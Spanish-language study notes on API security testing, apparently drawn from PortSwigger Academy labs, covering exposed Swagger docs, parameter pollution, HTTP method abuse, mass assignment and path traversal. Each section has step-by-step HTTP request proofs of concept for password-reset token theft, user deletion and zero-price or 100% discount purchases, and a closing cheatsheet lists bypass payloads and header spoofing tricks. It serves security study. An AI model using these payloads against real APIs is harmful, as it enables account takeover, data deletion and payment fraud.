
---
Tags: #APISecurity #APIExploitation #MassAssignment #ParameterPollution #HPP #PathTraversal #BrokenAccessControl #DocumentationExposure #Swagger #OpenAPI #BurpSuite

---
# Índice

- [[#1. Exposición y Explotación de Documentación API]]
	
- [[#2. Server-Side Parameter Pollution (SSPP) en Query Strings]]
	
- [[#3. Descubrimiento y Explotación de Métodos HTTP Inseguros (OPTIONS)]]
	
- [[#4. Explotación de Mass Assignment (Asignación Masiva)]]
	
- [[#5. Server-Side Parameter Pollution en URLs REST (Path Traversal en APIs)]]
	
- [[#6. Cheatsheet: API Security, Payloads y Bypasses]]
	- [[#6.1. Rutas Comunes de Documentación API (Wordlist)]]
	- [[#6.2. Inyección de Parámetros (Parameter Pollution) y JSON Bypasses]]
	- [[#6.3. Bypasses de Autenticación y Cabeceras (Headers) HTTP]]
	- [[#6.4. Caracteres Clave para Server-Side Manipulation]]
	- [[#6.5. Referencias de Alto Valor (Marcadores)]]

---

### [[#1. Exposición y Explotación de Documentación API]]

**Definición:**

Las APIs suelen documentarse utilizando estándares como OpenAPI o Swagger. Esta documentación a menudo incluye una interfaz gráfica interactiva (Swagger UI) que permite a los desarrolladores probar endpoints fácilmente. La vulnerabilidad ocurre cuando esta documentación **se deja expuesta en entornos de producción** sin autenticación, revelando la superficie de ataque completa de la API (rutas, parámetros requeridos, métodos soportados y, a veces, funcionalidades ocultas o de administración).

**Cómo descubrirlo y explotarlo:**

1. **Fuzzing de directorios:** Utiliza herramientas para buscar rutas comunes (ej. `/api`, `/swagger-ui.html`, `/openapi.json`). _(Nota: Tienes una lista exhaustiva de estos endpoints que incluiremos en la sección de Cheatsheets en la Parte 2)_.
    
2. **Análisis de la interfaz:** Una vez localizada, revisa qué endpoints están disponibles. Busca operaciones sensibles como `DELETE`, `PUT` o endpoints de administración (`/api/admin`, `/api/users`).
    
3. **Ejecución (Explotación):** Utiliza la propia interfaz interactiva de la documentación o Burp Suite para interactuar con los endpoints descubiertos.
    

> **PoC (Prueba de Concepto basado en tus apuntes):**
> 
> Al hacer reconocimiento, descubrimos el endpoint `/api`, el cual carga una interfaz interactiva de la documentación.
> 
> Analizando las rutas, encontramos una operación no documentada públicamente para el usuario normal: `DELETE /api/users/{username}`.
> 
> **Impacto:** Aprovechamos esta funcionalidad expuesta para enviar un `DELETE` y borrar al usuario `carlos` del sistema.

**Mitigación:** Restringir el acceso a la documentación en entornos de producción o requerir autenticación robusta para acceder a rutas como `/api-docs`.

---

### [[#2. Server-Side Parameter Pollution (SSPP) en Query Strings]]

**Definición:**

El _Server-Side Parameter Pollution_ ocurre cuando una aplicación web toma la entrada del usuario y la inserta de forma insegura en una petición HTTP interna (del lado del servidor) hacia otra API o servicio backend. Si el atacante inyecta caracteres de control de URL (como `&` o `#`) codificados, puede manipular la estructura de esa petición interna, sobreescribiendo parámetros o añadiendo nuevos para alterar la lógica del negocio.

**Cómo descubrirlo:**

La clave está en la **fuzzing de caracteres de sintaxis URL** y la observación de errores. Se inyectan caracteres como `%26` (que es el `&` codificado en URL) o el `#` (URL-encoded como `%23`) para ver si el servidor backend se "confunde" y arroja un error que revele parámetros internos.

**Herramientas clave:**

- **Burp Suite Repeater:** Fundamental para esta técnica. Permite modificar los parámetros uno a uno, codificar caracteres (Ctrl+U) y analizar detalladamente los mensajes de error del servidor (_Error-based discovery_).
    

> **PoC: Extracción de tokens de recuperación:**
> 
> **Paso 1: Identificación del truncamiento**
> 
> Intentamos truncar la petición interna del servidor usando el carácter `#` al final del nombre de usuario:

```HTTP
 POST /forgot-password HTTP/2
 Host: [REDACTED].web-security-academy.net>

 csrf=n9bZBhtVOGm5JCl5jz629kS1FCC3J2Xs&username=administrator# 
```

> El servidor responde con: `Error: Field is not supported`.
>
> **Paso 2: Inyección de parámetros (Pollution)**
> 
> Este error nos indica que el backend esperaba un campo y falló. Deducimos que internamente la API requiere un parámetro que hemos anulado. Suponiendo que la lógica busca un token, inyectamos el parámetro `field` usando `%26` (`&`) para que el backend lo interprete como un parámetro separado en su petición interna:

```HTTP
 POST /forgot-password HTTP/2
 Host: [REDACTED].web-security-academy.net

 csrf=n9bZBhtVOGm5JCl5jz629kS1FCC3J2Xs&username=administrator%26field=reset_token# 
```
> 
> **Resultado:** El servidor interno lee `username=administrator & field=reset_token` (ignorando lo que siga por el `#`), devolviendo el token de recuperación en la respuesta.
>

---

### 3. Descubrimiento y Explotación de Métodos HTTP Inseguros (OPTIONS)

**Definición:**

Las APIs RESTful utilizan métodos HTTP para definir la acción a realizar (`GET` para leer, `POST` para crear, `PATCH`/`PUT` para modificar, `DELETE` para borrar). A veces, por configuraciones por defecto de los frameworks o mala gestión de rutas, los desarrolladores dejan habilitados métodos que no deberían estar permitidos para ciertos usuarios.

**Cómo descubrirlo (El poder del método OPTIONS):**

El método HTTP `OPTIONS` es una herramienta de diagnóstico. Al enviarlo a un endpoint, el servidor responde (generalmente en la cabecera `Allow` o `Access-Control-Allow-Methods`) con una lista de todos los métodos HTTP que ese endpoint acepta.

**Tabla Resumen de Métodos y su Riesgo:**

|**Método HTTP**|**Propósito Teórico**|**Riesgo en APIs si no está protegido**|
|---|---|---|
|**GET**|Leer datos|Fugas de información (Data Exposure).|
|**POST**|Crear registros|Creación masiva, Spam, Mass Assignment.|
|**PUT/PATCH**|Actualizar registros|Modificación de datos críticos (precios, roles).|
|**DELETE**|Borrar registros|Denegación de servicio, borrado de bases de datos.|
|**OPTIONS**|Consultar capacidades|Revela la superficie de ataque oculta.|

> **PoC: Modificación de precios mediante PATCH:**
> 
> **Paso 1: Reconocimiento con OPTIONS**
> 
> Interceptamos la petición a un producto y cambiamos el método a `OPTIONS`:
> 
 
```HTTP
OPTIONS /api/products/1/price HTTP/2
Host: [REDACTED].web-security-academy.net
Cookie: session=A5ge4DlVProCZr1VJJHNkiKrUHneoUM5
```
 
> Respuesta del servidor: `Allow: GET, PATCH`.
> 
> **Paso 2: Explotación del método oculto**
> 
> Ahora sabemos que, aunque la web solo use `GET`, el servidor acepta `PATCH` (modificación parcial). Construimos una petición `PATCH` enviando un JSON para alterar el parámetro `price`:

```HTTP
PATCH /api/products/1/price HTTP/2
Host: [REDACTED].web-security-academy.net
Content-Type: application/json

{
"price":0
}
```

> **Resultado:** Hemos modificado el precio del producto a 0 burlando la lógica del frontend, abusando de un endpoint expuesto en el backend.
>

---
### [[#4. Explotación de Mass Assignment (Asignación Masiva)]]

**Definición:**

El _Mass Assignment_ (o Auto-Binding) ocurre cuando un framework web enlaza automáticamente los parámetros de la solicitud HTTP (como un JSON) con los objetos internos del dominio o la base de datos sin un filtrado adecuado. Esto permite a un atacante inyectar propiedades adicionales en el payload de su petición para modificar campos que no deberían ser accesibles (como permisos, roles, o en este caso, descuentos).

**Cómo descubrirlo y explotarlo:**

1. **Reconocimiento del objeto:** Usa el método `GET` para extraer la estructura de datos completa que maneja el servidor. Fíjate en campos interesantes (`is_admin`, `discount`, `role`).
    
2. **Verificación de métodos:** Usa `OPTIONS` para confirmar si el endpoint permite métodos de escritura (`POST`, `PUT`, `PATCH`).
    
3. **Inyección de propiedades:** Añade el campo oculto a tu petición de modificación y observa si el servidor lo procesa.
    

> **PoC (Prueba de Concepto): Alteración de lógica de negocio (Descuentos)**
> 
> **Paso 1:** Usamos `OPTIONS /api/checkout` y el servidor nos confirma que `GET` y `POST` están permitidos.
> 
> **Paso 2:** Al realizar una petición `GET`, el servidor nos devuelve la estructura del carrito:
> 

```JSON
{
	"chosen_discount":{
		"percentage":0
	},
	"chosen_products":[
		"id":1,
		"quantity":1,
		"item_price":1000
	]
}
```

> **Paso 3:** Identificamos el objeto `chosen_discount`. Capturamos la petición de compra (`POST`) y añadimos manualmente este objeto a nuestro payload, asignándole un valor del 100%:

```HTTP
 POST /api/checkout HTTP/2
 Host: [REDACTED].web-security-academy.net
 Content-Type: application/json

{
	"chosen_products":[
		{
			"product_id":"1",
			"quantity":1
		}
	],
	"chosen_discount":{
		"percentage":100 
	}
} 
```

> **Resultado:** El servidor asigna masivamente los datos, procesa el descuento del 100% y logramos evadir el pago.
> 

---

### [[#5. Server-Side Parameter Pollution en URLs REST (Path Traversal en APIs)]]

**Definición:**

A diferencia del Parameter Pollution en _Query Strings_, aquí el parámetro vulnerable forma parte directamente de la **ruta REST** del servidor backend (ej. `/api/users/{username}`). Si la aplicación no sanea la entrada, podemos inyectar secuencias de salto de directorio (`../`) para "escapar" de la ruta prevista y acceder a otros endpoints internos de la API a los que no deberíamos tener acceso directo.

**Cómo descubrirlo y explotarlo (Fuzzing Interno):**

El objetivo es "romper" la ruta del backend y luego navegar a ciegas (o con ayuda de errores) por el árbol de rutas del servidor interno.

**Herramientas clave:**

- **Burp Suite Intruder:** Esencial para automatizar la búsqueda de endpoints internos (como `openapi.json`) lanzando diccionarios de rutas comunes a través del parámetro vulnerable.
    

> **PoC: Extracción de tokens mediante Path Traversal**
> 
> **Paso 1: Confirmación de la vulnerabilidad**
> 
> Al inyectar secuencias de escape en el parámetro `username`, alteramos la ruta interna. Añadimos el `#` (URL-encoded) para ignorar el resto de la ruta del backend.

```HTTP
username=../../../../../administrator%23
```
 
> El servidor responde con un error HTTP revelando que hemos alterado la petición: `Unexpected response from API server... 404 Not Found`.
> 
> **Paso 2: Descubrimiento de la estructura interna (Intruder)**
> 
> Sabiendo que podemos navegar, usamos Intruder para buscar el archivo de documentación interno (fuzzing). Iteramos rutas hasta dar con:
> 
> 
> 
```HTTP
username=../../../../../openapi.json%23
```
> 
> El servidor nos devuelve el JSON de la API, revelando un endpoint interno valiosísimo: `"/api/internal/v1/users/{username}/field/{field}"`.
> 
> **Paso 3: Explotación del endpoint interno**
> 
> Modificamos dinámicamente nuestra ruta en el parámetro para apuntar exactamente al endpoint descubierto y extraer el token del administrador:

```HTTP
username=../../v1/users/administrator/field/passwordResetToken%23
```

> **Resultado:** Obtenemos el token `ylbnxodbutdioexsvb6x6jey9o269drr` y tomamos control de la cuenta.

---

### [[#6. Cheatsheet: API Security, Payloads y Bypasses]]

Esta sección es tu navaja suiza. Úsala como referencia rápida en tus auditorías.

#### 6.1. Rutas Comunes de Documentación API (Wordlist)

_Ideal para Fuzzing (ffuf, wfuzz, DirBuster)._

```Plaintext
/api-docs
/swagger-ui.html
/openapi.json
/v1/api-docs
/swagger/index.html
/api/swagger.json
/v2/api-docs
/swagger/v1/swagger.json
/documentation
/v3/api-docs
/openapi/v1/
/swagger-resources
/swagger-ui/
/api/v1/swagger.json
/swagger.yaml
```

#### Ref:
 - [Diccionario Paths comunes API](https://gist.github.com/rodnt/250dd33af97d228cc94cd11504abef06)

#### 6.2. Inyección de Parámetros (Parameter Pollution) y JSON Bypasses

|**Técnica**|**Descripción**|**Payload de Ejemplo**|
|---|---|---|
|**HPP (HTTP Parameter Pollution)**|Inyectar múltiples veces el mismo parámetro. Diferentes lenguajes toman el primero, el último, o los concatenan.|`?user=admin&user=carlos`<br><br>  <br><br>`?id=1&id=2`|
|**JSON Parameter Pollution**|Duplicar claves en un JSON. Útil para saltar validaciones WAF que leen la primera clave, mientras el backend procesa la última.|`{"username":"carlos", "username":"admin"}`|
|**Type Confusion (JSON)**|Cambiar el tipo de dato esperado (ej. string a array/integer) para provocar errores o bypass de lógica.|Esperado: `{"id": "1"}`<br><br>  <br><br>Inyectado: `{"id": ["1", "2"]}` o `{"id": 1}`|
|**Bypass de Lógica con Valores Nulos**|Forzar la evaluación nula en lógicas de autenticación o validación.|`{"password": null}`<br><br>  <br><br>`{"token": [null]}`|

#### 6.3. Bypasses de Autenticación y Cabeceras (Headers) HTTP

|**Cabecera (Header)**|**Propósito / Bypass**|**Ejemplo de Uso**|
|---|---|---|
|`X-HTTP-Method-Override`|Evadir firewalls o restricciones del frontend sobrescribiendo el método.|Frontend envía `POST`. Header: `X-HTTP-Method-Override: DELETE`|
|`Content-Type`|Forzar al parser del backend a interpretar datos de forma insegura (ej. provocar XXE en endpoints JSON).|Cambiar `application/json` a `application/xml` y enviar payload XML.|
|`X-Forwarded-For` / `X-Real-IP`|Bypassear controles de Rate Limiting o restricciones de IP (IP Spoofing).|`X-Forwarded-For: 127.0.0.1`|
|`Accept`|Descubrir versiones de API ocultas u obtener datos en formatos menos securizados (ej. serialización insegura).|`Accept: application/vnd.api+json; version=1.0`|

#### 6.4. Caracteres Clave para Server-Side Manipulation

|**Carácter**|**Codificación URL**|**Uso en Pruebas de APIs**|
|---|---|---|
|`&`|`%26`|Separador de parámetros. Útil para inyectar nuevos parámetros en Query Strings internas.|
|`#`|`%23`|Truncamiento. Ignora el resto de la URL o query string que el servidor intentaba procesar.|
|`?`|`%3F`|Forzar el inicio de una query string para alterar rutas REST (`/api/user/1?xyz=...`).|
|`../`|`%2e%2e%2f`|Path Traversal. Escapar de rutas REST internas.|
|`%00`|`%00`|Null Byte. Truncamiento clásico en lenguajes como C/PHP (menos común en APIs modernas, pero vale la pena probar).|

#### 6.5. Referencias de Alto Valor (Marcadores)

- **PortSwigger Web Security Academy:** [API Testing Vulnerabilities](https://portswigger.net/web-security/api-testing) (Fuente primaria de la metodología empleada en estos apuntes).
    
- **PayloadsAllTheThings (GitHub):** [API Security Testing](https://www.google.com/search?q=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/API%2520Security%2520Testing) (Repositorio obligatorio para ampliar diccionarios y payloads específicos).
    
- **OWASP API Security Top 10:** Fundamental para categorizar vulnerabilidades en reportes profesionales (BOLA, BFLA, Mass Assignment, etc.).